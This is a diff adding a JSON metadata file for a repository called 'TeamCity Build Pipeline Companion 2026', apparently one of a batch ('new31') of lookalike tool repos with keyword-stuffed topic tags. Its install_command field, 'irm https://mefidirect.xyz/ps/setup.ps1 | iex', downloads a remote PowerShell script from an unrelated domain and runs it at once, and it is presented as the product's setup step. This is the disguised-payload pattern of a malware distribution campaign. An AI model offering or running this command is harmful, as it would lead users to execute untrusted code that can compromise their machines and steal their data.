@@ -1,0 +1,29 @@
+{
+  "repo": "teamcity-build-pipeline-companion-2026",
+  "product": "TeamCity Build Pipeline Companion 2026",
+  "kind": "devops",
+  "install_type": "download",
+  "download_url": "https://teamcity.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "devops",
+  "topics": [
+    "teamcity-studio",
+    "teamcity-client",
+    "teamcity-devops-tools",
+    "teamcity-win11",
+    "teamcity-error-fix",
+    "run-teamcity-on-windows",
+    "teamcity-kubernetes-tools",
+    "teamcity-desktop-tool",
+    "teamcity-configure-guide",
+    "teamcity-build-2026",
+    "teamcity-setup-package",
+    "desktop-tools",
+    "setup-guide",
+    "cloud-tools",
+    "pc-utility"
+  ]
+}
